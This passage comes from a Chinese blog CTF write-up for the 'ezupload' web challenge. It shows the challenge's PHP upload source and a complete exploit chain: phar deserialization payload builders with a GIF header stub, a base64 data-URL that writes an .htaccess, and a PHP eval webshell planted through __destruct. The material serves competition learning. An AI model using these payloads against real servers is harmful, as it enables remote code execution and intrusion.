&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $r = parse_url(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($r[<span class="string">'scheme'</span>]) || preg_match(<span class="string">"/file|php/i"</span>,$r[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'..'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'/'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = substr(<span class="keyword">$this</span>-&gt;filename, strrpos(<span class="keyword">$this</span>-&gt;filename, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/ph/i"</span>, $ext))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;url,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename,$content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($dir === <span class="string">''</span>)&#123;</span><br><span class="line">            $num = count(scandir(<span class="keyword">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $num = count(scandir($dir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you have $num files"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you don't have file"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> implode(<span class="string">" "</span>,scandir(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">        <span class="keyword">echo</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="keyword">new</span> dir($_POST[<span class="string">'url'</span>],$_POST[<span class="string">'filename'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'action'</span>] === <span class="string">"upload"</span>) &#123;</span><br><span class="line">    $dir-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"remove"</span>) &#123;</span><br><span class="line">    $dir-&gt;remove();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"count"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'dir'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count(<span class="string">''</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count($_POST[<span class="string">'dir'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>三个关键点</p>
+<ul>
+<li>Upload文件上传</li>
+<li>__destruct写文件</li>
+<li>__toString扫目录</li>
+</ul>
+<p>题目给了一个提示为</p>
+<p>hint1: webroot changes every 10 mins</p>
+<p>也就是我们所在的目录是会随机变得</p>
+<p>而且由于__destruct触发的file_put_contents工作目录为根目录，所以需要先知道目前所处绝对路径</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">    file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">    <span class="keyword">echo</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么思路就比较清晰了</p>
+<p>首先传一个phar文件上去，接着通过file_get_contents触发phar反序列化得到目前所处目录，接着通过data协议写一个htaccess进去，由于对htaccess进行了一些过滤，需要通过下面的payload绕过一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure>
+
+<p>最后通过__destruct写入把我们的木马写入这个txt中即可解析</p>
+<h4 id="当前绝对路径获取"><a href="#当前绝对路径获取" class="headerlink" title="当前绝对路径获取"></a>当前绝对路径获取</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir-&gt;userdir = <span class="string">"../"</span>;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($d); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">""</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>为了避免文件内容被关键词黑名单检测，可以将phar文件用gzip压缩，将生成的test.phar.gz放到vps上</p>
+<p>通过upload上传到userdir下，接下来通过file_get_contents触发phar反序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;phar:&#x2F;&#x2F;upload&#x2F;xx&#x2F;test.phar.gz</span><br></pre></td></tr></table></figure>
+
+<p>即可通过触发phar反序列化拿到路径</p>
+<h4 id="写入htaccess"><a href="#写入htaccess" class="headerlink" title="写入htaccess"></a>写入htaccess</h4><p>因为这个userdir已经控制掉了一些php的相关后缀，并且连&lt;和?都已经过滤掉了 ，直接写php是肯定不可能了，所以可以考虑写htaccess，并且通过__destruct触发的file_put_contents将文件写到这个目录下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;data:image&#x2F;png;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure>
+
+<h4 id="写入txt"><a href="#写入txt" class="headerlink" title="写入txt"></a>写入txt</h4><p>触发phar反序列化写入txt文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;userdir = <span class="string">'&lt;?php eval($_POST[1]);?&gt;'</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;filename = <span class="string">"/var/www/html/webroot/upload/userdir/xx"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp= <span class="keyword">new</span> dir();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"test1.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($exp); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">""</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>同样gzip压缩一下，通过phar协议访问Phar://xxx/xx.gz触发phar,再去访问这个txt，可以看到已经被解析为php</p>
+<p>拿到马会发现有个open_basedir限制，传统payload bypass下就可以了。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/26/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BA%BF%E4%B8%8B%E9%A2%98%E7%9B%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="2019红帽杯线下题目漏洞分析">
+                <i class="fa fa-chevron-left"></i> 2019红帽杯线下题目漏洞分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/12/02/2019%E5%AE%89%E6%B4%B5%E6%9D%AFweb%E9%A2%98%E8%A7%A3/" rel="prev" title="2019安洵杯web题解">
+                2019安洵杯web题解 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">离怀秋</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">72</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lihuaiqiu" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southseast.cc" title="南溟师傅" target="_blank">南溟师傅</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easyweb"><span class="nav-number">2.</span> <span class="nav-text">easyweb</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Showhub"><span class="nav-number">3.</span> <span class="nav-text">Showhub</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezupload"><span class="nav-number">4.</span> <span class="nav-text">ezupload</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#当前绝对路径获取"><span class="nav-number">4.1.</span> <span class="nav-text">当前绝对路径获取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写入htaccess"><span class="nav-number">4.2.</span> <span class="nav-text">写入htaccess</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写入txt"><span class="nav-number">4.3.</span> <span class="nav-text">写入txt</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">离怀秋</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
